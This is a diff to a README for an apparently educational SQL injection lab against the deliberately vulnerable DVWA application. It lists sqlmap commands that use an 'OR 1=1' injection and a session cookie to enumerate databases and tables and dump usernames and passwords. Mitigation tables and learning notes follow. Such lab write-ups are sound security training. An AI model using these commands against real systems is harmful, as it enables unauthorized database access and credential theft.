@@ -1,10 +1,10 @@
 # SQL Injection Lab
 
 ## Objective
-This lab demonstrates SQL injection testing and database enumeration using SQLMap against the deliberately vulnerable web application Damn Vulnerable Web Application(DVWA). The goal is to understand how attackers enumerate databases, retrieve table information, and extract sensitive data from insecure web applications.
+This lab demonstrates SQL injection testing and database enumeration using SQLMap against the intentionally vulnerable Damn Vulnerable Web Application (DVWA). The objective is to understand how SQL injection can be exploited to enumerate databases, extract schema information, and retrieve sensitive data from insecure web applications.
 
 ## Tools Used
-- Kali Linux (The attacck machine)
+- Kali Linux (The attack machine)
 - SQLMap (SQL Injection automation)
 - DVWA (A vulnerable test website)
 - Browser (To access DVWA)
@@ -15,50 +15,58 @@ This lab demonstrates SQL injection testing and database enumeration using SQLMa
 - Listed tables and columns
 - Extracted sample data
 
-## Commands Used
-```bash
-i) sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
+# 1. Database enumeration
+sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
 --cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
 --dbs
-ii) sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
+
+# 2. List tables in DVWA database
+sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
 --cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
 -D dvwa --tables
-iii) sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
+
+# 3. Extract columns from users table
+sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
 --cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
 -D dvwa -T users --columns
-iv) sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
+
+# 4. Dump username and password data
+sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
 --cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
 -D dvwa -T users -C user,password --dump
 
 ```
 
 ## Skills Demonstrated
-- Web application security testing
-- SQL injection detection
-- Database enumeration
-- Vulnerability assessment
-- Table discovery
-- Column extraction
-- Data dumping
-- Offensive security methodology
+- Web application penetration testing (SQL Injection)
+- SQLMap-based automated exploitation
+- Database enumeration and schema discovery
+- Sensitive data extraction and analysis
+- Vulnerability assessment and validation
+- Secure coding awareness (OWASP Top 10: Injection)
 
 
-## Identification of Security Risks
-| Vulnerability                | Risk                         |
-| ---------------------------- | ---------------------------- |
-| SQL Injection                | Unauthorized database access |
-| Poor input validation        | Data leakage                 |
-| Weak authentication handling | Session abuse                |
-| Exposed database structure   | Information disclosure       |
+
+## Identification of Security Impact
+| Vulnerability              | Security Impact                                       |
+| -------------------------- | ----------------------------------------------------- |
+| SQL Injection              | Unauthorized database access and data exfiltration    |
+| Poor input validation      | Execution of malicious SQL queries                    |
+| Weak session handling      | Session hijacking or abuse                            |
+| Exposed database structure | Increased attack surface and reconnaissance advantage |
+
 
 ## Mitigation Recommendations
-| Mitigation                     | Purpose                     |
-| ------------------------------ | --------------------------- |
-| Prepared statements            | It prevents injection       |
-| Parameterized queries          | Separates code from data    |
-| Input validation               | Blocks malicious payloads   |
-| Least privilege DB accounts    | It limits attacker impact   |
-| Web Application Firewall (WAF) | Detects malicious requests  |
-| Error handling                 | Prevents information leakage|
+| Mitigation                        | Purpose                                    |
+| --------------------------------- | ------------------------------------------ |
+| Prepared statements               | Prevents direct SQL query manipulation     |
+| Parameterized queries             | Separates user input from SQL logic        |
+| Input validation & sanitization   | Blocks malicious payloads before execution |
+| Least privilege database accounts | Limits damage from compromised queries     |
+| Web Application Firewall (WAF)    | Detects and blocks injection patterns      |
+| Secure error handling             | Prevents database structure leakage        |
+
+## Key Learning Outcome
+This lab demonstrated how SQL injection vulnerabilities can be exploited using automated tools like SQLMap to extract sensitive database information. It reinforced the importance of secure coding practices and input validation in preventing injection-based attacks.
 
 
